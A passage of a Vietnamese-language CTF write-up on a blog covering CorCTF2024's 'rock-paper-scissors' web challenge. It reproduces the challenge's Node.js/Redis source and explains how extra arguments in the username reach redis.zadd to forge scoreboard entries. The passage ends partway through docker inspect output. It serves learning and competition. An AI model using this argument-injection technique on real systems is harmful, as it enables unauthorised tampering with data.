@@ -1,0 +1,2110 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>CorCTF2024 - WEB &#39;s challenges - Zoltán&#39;s Blog</title>
+  <meta name="description" content="WEB challs rock-paper-scissors [79 solves]  Một chall kéo - búa - bao với nodejs &#43; redis để lưu số lần thắng của người chơi.  analysis  Ta sẽ đi vào phần tích các api của server:  import Redis from &#39;ioredis&#39;;import fastify from &#39;fastify&#39;;import fastifyStatic from &#39;@fastify/static&#39;;import fastifyJwt from &#39;@fastify/jwt&#39;;import fastifyCookie from &#39;@fastify/cookie&#39;;import { join } from &#39;node:path&#39;;import { randomBytes, randomInt } from &#39;node:crypto&#39;;const redis = new Redis(6379, &quot;redis&quot;);const app = fastify();const winning = new Map([[&#39;🪨&#39;, &#39;📃&#39;],[&#39;📃&#39;, &#39;✂️&#39;],[&#39;✂️&#39;, &#39;🪨&#39;]]);app.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-07-27-corctf2024\/",
+          "name": "Cor ctf2024 web \u0027s challenges"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "CorCTF2024 - WEB \u0027s challenges",
+  "description" : "WEB challs rock-paper-scissors [79 solves]  Một chall kéo - búa - bao với nodejs \u002b redis để lưu số lần thắng của người chơi.  analysis  Ta sẽ đi vào phần tích các api của server:  import Redis from \u0027ioredis\u0027;\rimport fastify from \u0027fastify\u0027;\rimport fastifyStatic from \u0027@fastify\/static\u0027;\rimport fastifyJwt from \u0027@fastify\/jwt\u0027;\rimport fastifyCookie from \u0027@fastify\/cookie\u0027;\rimport { join } from \u0027node:path\u0027;\rimport { randomBytes, randomInt } from \u0027node:crypto\u0027;\rconst redis = new Redis(6379, \u0026quot;redis\u0026quot;);\rconst app = fastify();\rconst winning = new Map([\r[\u0027🪨\u0027, \u0027📃\u0027],\r[\u0027📃\u0027, \u0027✂️\u0027],\r[\u0027✂️\u0027, \u0027🪨\u0027]\r]);\rapp.",
+  "inLanguage" : "en",
+  "wordCount":  6653 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-07-27-corctf2024\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="CorCTF2024 - WEB &#39;s challenges" />
+<meta property="og:description" content="WEB challs rock-paper-scissors [79 solves]  Một chall kéo - búa - bao với nodejs &#43; redis để lưu số lần thắng của người chơi.  analysis  Ta sẽ đi vào phần tích các api của server:  import Redis from &#39;ioredis&#39;;import fastify from &#39;fastify&#39;;import fastifyStatic from &#39;@fastify/static&#39;;import fastifyJwt from &#39;@fastify/jwt&#39;;import fastifyCookie from &#39;@fastify/cookie&#39;;import { join } from &#39;node:path&#39;;import { randomBytes, randomInt } from &#39;node:crypto&#39;;const redis = new Redis(6379, &quot;redis&quot;);const app = fastify();const winning = new Map([[&#39;🪨&#39;, &#39;📃&#39;],[&#39;📃&#39;, &#39;✂️&#39;],[&#39;✂️&#39;, &#39;🪨&#39;]]);app.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-07-27-corctf2024/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="CorCTF2024 - WEB &#39;s challenges" />
+  <meta name="twitter:description" content="WEB challs rock-paper-scissors [79 solves]  Một chall kéo - búa - bao với nodejs &#43; redis để lưu số lần thắng của người chơi.  analysis  Ta sẽ đi vào phần tích các api của server:  import Redis from …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>CorCTF2024 - WEB &#39;s challenges</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="web-challs">WEB challs</h1>
+<h2 id="rock-paper-scissors-79-solves">rock-paper-scissors [79 solves]</h2>
+<p><img src="https://hackmd.io/_uploads/S1ijHFLKA.png" alt="image"></p>
+<ul>
+<li>Một chall kéo - búa - bao với nodejs + redis để lưu số lần thắng của người chơi.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/S1pGsd8tA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rJumj_UtA.png" alt="image"></p>
+<h3 id="analysis">analysis</h3>
+<ul>
+<li>Ta sẽ đi vào phần tích các api của server:</li>
+</ul>
+<pre><code>import Redis from 'ioredis';
+import fastify from 'fastify';
+import fastifyStatic from '@fastify/static';
+import fastifyJwt from '@fastify/jwt';
+import fastifyCookie from '@fastify/cookie';
+import { join } from 'node:path';
+import { randomBytes, randomInt } from 'node:crypto';
+
+const redis = new Redis(6379, &quot;redis&quot;);
+const app = fastify();
+
+const winning = new Map([
+	['🪨', '📃'],
+	['📃', '✂️'],
+	['✂️', '🪨']
+]);
+
+app.register(fastifyStatic, {
+	root: join(import.meta.dirname, 'static'),
+	prefix: '/'
+});
+
+app.register(fastifyJwt, { secret: process.env.SECRET_KEY || randomBytes(32), cookie: { cookieName: 'session' } });
+
+app.register(fastifyCookie);
+
+await redis.zadd('scoreboard', 1336, 'FizzBuzz101');
+
+app.post('/new', async (req, res) =&gt; {
+	const { username } = req.body;
+	const game = randomBytes(8).toString('hex');
+	await redis.set(game, 0);
+	return res.setCookie('session', await res.jwtSign({ username, game })).send('OK');
+});
+
+app.post('/play', async (req, res) =&gt; {
+	try {
+		await req.jwtVerify();
+	} catch(e) {
+		return res.status(400).send({ error: 'invalid token' });
+	}
+	const { game, username } = req.user;
+	const { position } = req.body;
+	const system = ['🪨', '📃', '✂️'][randomInt(3)];
+	if (winning.get(system) === position) {
+		const score = await redis.incr(game);
+
+		return res.send({ system, score, state: 'win' });
+	} else {
+		const score = await redis.getdel(game);
+		if (score === null) {
+			return res.status(404).send({ error: 'game not found' });
+		}
+		await redis.zadd('scoreboard', score, username);
+		return res.send({ system, score, state: 'end' });
+	}
+});
+
+app.get('/scores', async (req, res) =&gt; {
+	const result = await redis.zrevrange('scoreboard', 0, 99, 'WITHSCORES');
+	const scores = [];
+	for (let i = 0; i &lt; result.length; i += 2) {
+		scores.push([result[i], parseInt(result[i + 1], 10)]);
+	}
+	return res.send(scores);
+});
+
+app.get('/flag', async (req, res) =&gt; {
+	try {
+		await req.jwtVerify();
+	} catch(e) {
+		return res.status(400).send({ error: 'invalid token' });
+	}
+	const score = await redis.zscore('scoreboard', req.user.username);
+	if (score &amp;&amp; score &gt; 1336) {
+		return res.send(process.env.FLAG || 'corctf{test_flag}');
+	}
+	return res.send('You gotta beat Fizz!');
+})
+
+app.listen({ host: '0.0.0.0', port: 8080 }, (err, address) =&gt; console.log(err ?? `web/rock-paper-scissors listening on ${address}`));
+</code></pre><ul>
+<li>
+<p>Như ta quan sát thì đúng với logic bình thường -&gt; tạo new user -&gt; api play -&gt; có api scores để quan sát tất cả những người chơi + điểm số của họ.</p>
+</li>
+<li>
+<p>Và khi điểm số của người chơi &gt; 1336 thì sẽ nhận <code>FLAG</code>.</p>
+</li>
+<li>
+<p>Hướng giải quyết mà mình nghĩ đến đầu tiên là truy cập với user <code>FizzBuzz101</code> vì điểm số của anh ấy là 1336 và ta chỉ cần win 1 màn nữa là sẽ được flag nhưng không may api <code>/new</code> đã ngăn chặn nó lại -&gt; khi người chơi tạo một game mới với username thì server random ra id của game -&gt; set giá trị của game đó với điểm số là 0 đầu tiên -&gt; sau đó mới tạo ra session với jwt.</p>
+</li>
+<li>
+<p>Sau một hồi research thì có vẻ như không có bất kì bug gì đến từ các thư viện đang được dùng.</p>
+</li>
+<li>
+<p>Ta cùng phân tích rõ hơn api <code>/play</code>:</p>
+</li>
+</ul>
+<pre><code>app.post('/play', async (req, res) =&gt; {
+	try {
+		await req.jwtVerify();
+	} catch(e) {
+		return res.status(400).send({ error: 'invalid token' });
+	}
+	const { game, username } = req.user;
+	const { position } = req.body;
+	const system = ['🪨', '📃', '✂️'][randomInt(3)];
+	if (winning.get(system) === position) {
+		const score = await redis.incr(game);
+
+		return res.send({ system, score, state: 'win' });
+	} else {
+		const score = await redis.getdel(game);
+		if (score === null) {
+			return res.status(404).send({ error: 'game not found' });
+		}
+		await redis.zadd('scoreboard', score, username);
+		return res.send({ system, score, state: 'end' });
+	}
+});
+
+</code></pre><ul>
+<li>
+<p>Với method post mà client gửi đến trước tiên thì server sẽ check session với jwt middleware với thích hợp từ <code>@fastify/jwt</code> -&gt; nếu vượt qua thì nhận giá trị <code>game</code> &amp; <code>username</code> được xử lí ở middlware trả ra -&gt; nhận position -&gt; sau đó sẽ tiến hành random ra 1 trong 3 giá trị kéo - búa - bao -&gt; nếu người chơi chọn kết quả thắng khi mà hệ thống random thì dùng hàm <code>redis.incr</code> tăng giá trị điểm lưu trong redis với game hiện tại lên 1 point -&gt; trả ra giá trị điểm, &hellip; -&gt; ngược lại nếu thua thì sẽ <code>redis.getdel</code> reset point của game về 0 -&gt; gọi <code>redis.zadd('scoreboard', score, username);</code> -&gt; trả về các giá trị tương tự.</p>
+</li>
+<li>
+<p>Và bug ở đây nằm ở <code>redis.zadd('scoreboard', score, username);</code> anh <code>Nam</code> trong team đã seaching ra.</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BkR1QdIYC.png" alt="image"></p>
+<ul>
+<li>Như hình có thể thấy là ta có thể truyền nhiều đối số cho nó và khi đó redis sẽ lưu nó là các key và value mới vào <code>sorted set &quot;scoreboard&quot;</code></li>
+</ul>
+<pre><code>PS D:\ctf_chall\corCTF2024\rock-paper-scissors&gt; docker ps
+CONTAINER ID   IMAGE                       COMMAND                  CREATED         STATUS         PORTS                     NAMES
+df2a46d93e8e   rock-paper-scissors-chall   &quot;docker-entrypoint.s…&quot;   3 minutes ago   Up 3 minutes   0.0.0.0:8080-&gt;8080/tcp    rock-paper-scissors-chall-1
+0828e098ad05   redis                       &quot;docker-entrypoint.s…&quot;   3 minutes ago   Up 3 minutes   0.0.0.0:60940-&gt;6379/tcp   rock-paper-scissors-redis-1
+PS D:\ctf_chall\corCTF2024\rock-paper-scissors&gt; docker inspect 0828e098ad05
+[
+    {
+        &quot;Id&quot;: &quot;0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d&quot;,
+        &quot;Created&quot;: &quot;2024-07-30T14:17:28.564934924Z&quot;,
+        &quot;Path&quot;: &quot;docker-entrypoint.sh&quot;,
+        &quot;Args&quot;: [
+            &quot;redis-server&quot;
+        ],
+        &quot;State&quot;: {
+            &quot;Status&quot;: &quot;running&quot;,
+            &quot;Running&quot;: true,
+            &quot;Paused&quot;: false,
+            &quot;Restarting&quot;: false,
+            &quot;OOMKilled&quot;: false,
+            &quot;Dead&quot;: false,
+            &quot;Pid&quot;: 603,
+            &quot;ExitCode&quot;: 0,
+            &quot;Error&quot;: &quot;&quot;,
+            &quot;StartedAt&quot;: &quot;2024-07-30T14:17:29.623337834Z&quot;,
+            &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;
+        },
+        &quot;Image&quot;: &quot;sha256:509b2fc82da65579aa63481c5b4909d1d777040ea574bf4be7aa1d6d48bf4b5f&quot;,
+        &quot;ResolvConfPath&quot;: &quot;/var/lib/docker/containers/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d/resolv.conf&quot;,
+        &quot;HostnamePath&quot;: &quot;/var/lib/docker/containers/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d/hostname&quot;,
+        &quot;HostsPath&quot;: &quot;/var/lib/docker/containers/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d/hosts&quot;,
+        &quot;LogPath&quot;: &quot;/var/lib/docker/containers/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d/0828e098ad05d9f2d42c2bb8421ae14fad2ddfa01b4cd9ff942060a073e7e88d-json.log&quot;,
+        &quot;Name&quot;: &quot;/rock-paper-scissors-redis-1&quot;,
+        &quot;RestartCount&quot;: 0,
+        &quot;Driver&quot;: &quot;overlay2&quot;,
+        &quot;Platform&quot;: &quot;linux&quot;,
+        &quot;MountLabel&quot;: &quot;&quot;,
+        &quot;ProcessLabel&quot;: &quot;&quot;,
+        &quot;AppArmorProfile&quot;: &quot;&quot;,
+        &quot;ExecIDs&quot;: [
+            &quot;ae2fd5e17736021cf9032d4720e46801ff0426b8d42b99b10c5bee51449d7c7e&quot;
+        ],
+        &quot;HostConfig&quot;: {
+            &quot;Binds&quot;: null,
+            &quot;ContainerIDFile&quot;: &quot;&quot;,
+            &quot;LogConfig&quot;: {
+                &quot;Type&quot;: &quot;json-file&quot;,
+                &quot;Config&quot;: {}
+            },
+            &quot;NetworkMode&quot;: &quot;rock-paper-scissors_default&quot;,
+            &quot;PortBindings&quot;: {
+                &quot;6379/tcp&quot;: [
+                    {
+                        &quot;HostIp&quot;: &quot;0.0.0.0&quot;,
+                        &quot;HostPort&quot;: &quot;0&quot;
+                    }
+                ]
+            },
+            &quot;RestartPolicy&quot;: {
+                &quot;Name&quot;: &quot;no&quot;,
+                &quot;MaximumRetryCount&quot;: 0
+            },
+            &quot;AutoRemove&quot;: false,
+            &quot;VolumeDriver&quot;: &quot;&quot;,
+            &quot;VolumesFrom&quot;: null,
+            &quot;ConsoleSize&quot;: [
+                0,
+                0
+            ],
+            &quot;CapAdd&quot;: null,
+            &quot;CapDrop&quot;: null,
+            &quot;CgroupnsMode&quot;: &quot;host&quot;,
+            &quot;Dns&quot;: null,
+            &quot;DnsOptions&quot;: null,
+            &quot;DnsSearch&quot;: null,
+            &quot;ExtraHosts&quot;: [],
+            &quot;GroupAdd&quot;: null,
+            &quot;IpcMode&quot;: &quot;private&quot;,
+            &quot;Cgroup&quot;: &quot;&quot;,
+            &quot;Links&quot;: null,
+            &quot;OomScoreAdj&quot;: 0,
+            &quot;PidMode&quot;: &quot;&quot;,
+            &quot;Privileged&quot;: false,
+            &quot;PublishAllPorts&quot;: false,
+            &quot;ReadonlyRootfs&quot;: false,
+            &quot;SecurityOpt&quot;: null,
+            &quot;UTSMode&quot;: &quot;&quot;,
+            &quot;UsernsMode&quot;: &quot;&quot;,
+            &quot;ShmSize&quot;: 67108864,
+            &quot;Runtime&quot;: &quot;runc&quot;,
+            &quot;Isolation&quot;: &quot;&quot;,
+            &quot;CpuShares&quot;: 0,
+            &quot;Memory&quot;: 0,
+            &quot;NanoCpus&quot;: 0,
+            &quot;CgroupParent&quot;: &quot;&quot;,
+            &quot;BlkioWeight&quot;: 0,
+            &quot;BlkioWeightDevice&quot;: null,
+            &quot;BlkioDeviceReadBps&quot;: null,
+            &quot;BlkioDeviceWriteBps&quot;: null,
+            &quot;BlkioDeviceReadIOps&quot;: null,
+            &quot;BlkioDeviceWriteIOps&quot;: null,
+            &quot;CpuPeriod&quot;: 0,
+            &quot;CpuQuota&quot;: 0,
+            &quot;CpuRealtimePeriod&quot;: 0,
+            &quot;CpuRealtimeRuntime&quot;: 0,
+            &quot;CpusetCpus&quot;: &quot;&quot;,
+            &quot;CpusetMems&quot;: &quot;&quot;,
+            &quot;Devices&quot;: null,
+            &quot;DeviceCgroupRules&quot;: null,
+            &quot;DeviceRequests&quot;: null,
+            &quot;MemoryReservation&quot;: 0,
+            &quot;MemorySwap&quot;: 0,
+            &quot;MemorySwappiness&quot;: null,
+            &quot;OomKillDisable&quot;: false,
+            &quot;PidsLimit&quot;: null,
+            &quot;Ulimits&quot;: null,
+            &quot;CpuCount&quot;: 0,
+            &quot;CpuPercent&quot;: 0,
+            &quot;IOMaximumIOps&quot;: 0,
+            &quot;IOMaximumBandwidth&quot;: 0,
+            &quot;MaskedPaths&quot;: [
+                &quot;/proc/asound&quot;,
+                &quot;/proc/acpi&quot;,
+                &quot;/proc/kcore&quot;,
+                &quot;/proc/keys&quot;,
+                &quot;/proc/latency_stats&quot;,
+                &quot;/proc/timer_list&quot;,
+                &quot;/proc/timer_stats&quot;,
+                &quot;/proc/sched_debug&quot;,
+                &quot;/proc/scsi&quot;,
+                &quot;/sys/firmware&quot;,
+                &quot;/sys/devices/virtual/powercap&quot;
+            ],
+            &quot;ReadonlyPaths&quot;: [
+                &quot;/proc/bus&quot;,
+                &quot;/proc/fs&quot;,
+                &quot;/proc/irq&quot;,
+                &quot;/proc/sys&quot;,
+                &quot;/proc/sysrq-trigger&quot;
+            ]
+        },
+        &quot;GraphDriver&quot;: {
+            &quot;Data&quot;: {
+                &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/0956a84f784478349b2b35ea9dd484f71640af4548951559e7dc94d996678f16-init/diff:/var/lib/docker/overlay2/946debb1c227499ed133261a8350b777051fc45e5ba8b6227fac8038b708a80b/diff:/var/lib/docker/overlay2/702e82dca889d22c0c13c1a0c3cdab75734cf61ca29a337f83dcf569c6bfa222/diff:/var/lib/docker/overlay2/c551b2d402dcdbedf4473365d972141221f004b7e6db13383fc0c9a4ce4ebd2c/diff:/var/lib/docker/overlay2/2b0b940379a57ef9e97145b23cb3d4d857ba7abbdbdccacc2e586c2ffe912cf4/diff:/var/lib/docker/overlay2/c4e1fdeb08461fd9958864b572dd18151b05d51acca9b9d428cb504642f9f831/diff:/var/lib/docker/overlay2/44a0bbfacb80080501b45ae78d2a0e54ed59171039bcbe1e7f6604e988ac4316/diff:/var/lib/docker/overlay2/ce06eacfcad13e2e0dbdc1cf9f4d7bbe906a6d37e5bcd97932b05321b4bf1dff/diff:/var/lib/docker/overlay2/defd33130a0d2062af3c9d7ecad24f4681d67947521aa6bd7f5405d6b42120b7/diff&quot;,
+                &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/0956a84f784478349b2b35ea9dd484f71640af4548951559e7dc94d996678f16/merged&quot;,
+                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/0956a84f784478349b2b35ea9dd484f71640af4548951559e7dc94d996678f16/diff&quot;,
+                &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/0956a84f784478349b2b35ea9dd484f71640af4548951559e7dc94d996678f16/work&quot;
+            },
+            &quot;Name&quot;: &quot;overlay2&quot;
+        },
+        &quot;Mounts&quot;: [
+            {
+                &quot;Type&quot;: &quot;volume&quot;,
+                &quot;Name&quot;: &quot;2f4aff134e0a7d51270d3aedd48d82ebeddffe1dd4453cc06a90f49f5e2b2f09&quot;,
+                &quot;Source&quot;: &quot;/var/lib/docker/volumes/2f4aff134e0a7d51270d3aedd48d82ebeddffe1dd4453cc06a90f49f5e2b2f09/_data&quot;,
+                &quot;Destination&quot;: &quot;/data&quot;,
+                &quot;Driver&quot;: &quot;local&quot;,
+                &quot;Mode&quot;: &quot;&quot;,
+                &quot;RW&quot;: true,
+                &quot;Propagation&quot;: &quot;&quot;
+            }
+        ],
+        &quot;Config&quot;: {
+            &quot;Hostname&quot;: &quot;0828e098ad05&quot;,
+            &quot;Domainname&quot;: &quot;&quot;,
+            &quot;User&quot;: &quot;&quot;,
+            &quot;AttachStdin&quot;: false,
+            &quot;AttachStdout&quot;: true,
+            &quot;AttachStderr&quot;: true,
+            &quot;ExposedPorts&quot;: {
+                &quot;6379/tcp&quot;: {}
+            },
+            &quot;Tty&quot;: false,
+            &quot;OpenStdin&quot;: false,
+            &quot;StdinOnce&quot;: false,
+            &quot;Env&quot;: [
+                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,
+                &quot;GOSU_VERSION=1.17&quot;,
+                &quot;REDIS_VERSION=7.4.0&quot;,
+                &quot;REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-7.4.0.tar.gz&quot;,
+                &quot;REDIS_DOWNLOAD_SHA=57b47c2c6682636d697dbf5d66d8d495b4e653afc9cd32b7adf9da3e433b8aaf&quot;
+            ],
+            &quot;Cmd&quot;: [
+                &quot;redis-server&quot;
+            ],
+            &quot;Image&quot;: &quot;redis&quot;,
+            &quot;Volumes&quot;: {
+                &quot;/data&quot;: {}
+            },
+            &quot;WorkingDir&quot;: &quot;/data&quot;,
+            &quot;Entrypoint&quot;: [
+                &quot;docker-entrypoint.sh&quot;
+            ],
+            &quot;OnBuild&quot;: null,
+            &quot;Labels&quot;: {
+                &quot;com.docker.compose.config-hash&quot;: &quot;576e5b3fdcf6ba4fa5287347812fae6e0b976d28cef9147629de74465af9a191&quot;,
+                &quot;com.docker.compose.container-number&quot;: &quot;1&quot;,
+                &quot;com.docker.compose.depends_on&quot;: &quot;&quot;,
+                &quot;com.docker.compose.image&quot;: &quot;sha256:509b2fc82da65579aa63481c5b4909d1d777040ea574bf4be7aa1d6d48bf4b5f&quot;,
+                &quot;com.docker.compose.oneoff&quot;: &quot;False&quot;,
+                &quot;com.docker.compose.project&quot;: &quot;rock-paper-scissors&quot;,
+                &quot;com.docker.compose.project.config_files&quot;: &quot;D:\\ctf_chall\\corCTF2024\\rock-paper-scissors\\docker-compose.yml&quot;,
+                &quot;com.docker.compose.project.working_dir&quot;: &quot;D:\\ctf_chall\\corCTF2024\\rock-paper-scissors&quot;,
+                &quot;com.docker.compose.service&quot;: &quot;redis&quot;,
+                &quot;com.docker.compose.version&quot;: &quot;2.28.1&quot;
+            }
+        },
+        &quot;NetworkSettings&quot;: {
+            &quot;Bridge&quot;: &quot;&quot;,
+            &quot;SandboxID&quot;: &quot;95a17f02a170390891788b5b5925113de8386e7e99c00d2cf2205fafbde5783a&quot;,
+            &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/95a17f02a170&quot;,
+            &quot;Ports&quot;: {
+                &quot;6379/tcp&quot;: [
+                    {
+                        &quot;HostIp&quot;: &quot;0.0.0.0&quot;,
+                        &quot;HostPort&quot;: &quot;60940&quot;
+                    }
+                ]
+            },
+            &quot;HairpinMode&quot;: false,
+            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,
+            &quot;LinkLocalIPv6PrefixLen&quot;: 0,
+            &quot;SecondaryIPAddresses&quot;: null,
+            &quot;SecondaryIPv6Addresses&quot;: null,
+            &quot;EndpointID&quot;: &quot;&quot;,
+            &quot;Gateway&quot;: &quot;&quot;,
+            &quot;GlobalIPv6Address&quot;: &quot;&quot;,
+            &quot;GlobalIPv6PrefixLen&quot;: 0,
+            &quot;IPAddress&quot;: &quot;&quot;,
+            &quot;IPPrefixLen&quot;: 0,
+            &quot;IPv6Gateway&quot;: &quot;&quot;,
+            &quot;MacAddress&quot;: &quot;&quot;,
+            &quot;Networks&quot;: {
+                &quot;rock-paper-scissors_default&quot;: {
+                    &quot;IPAMConfig&quot;: null,
+                    &quot;Links&quot;: null,
+                    &quot;Aliases&quot;: [
+                        &quot;rock-paper-scissors-redis-1&quot;,
+                        &quot;redis&quot;
+                    ],
+                    &quot;MacAddress&quot;: &quot;02:42:ac:12:00:02&quot;,
+                    &quot;DriverOpts&quot;: null,
